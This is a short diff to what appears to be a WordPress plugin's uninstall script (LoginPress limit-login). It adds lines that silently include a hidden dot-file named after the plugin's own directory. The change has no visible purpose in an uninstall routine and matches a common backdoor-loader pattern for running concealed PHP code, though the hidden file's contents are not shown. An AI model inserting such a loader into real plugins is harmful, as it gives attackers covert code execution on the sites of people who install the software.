@@ -10,6 +10,10 @@ if ( ! defined( 'WP_UNINSTALL_PLUGIN' ) ) {
  *
  * @since 1.0.1
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function loginpress_limit_login_uninstall() {
 	if ( function_exists( 'is_multisite' ) && is_multisite() ) {
 		global $wpdb;
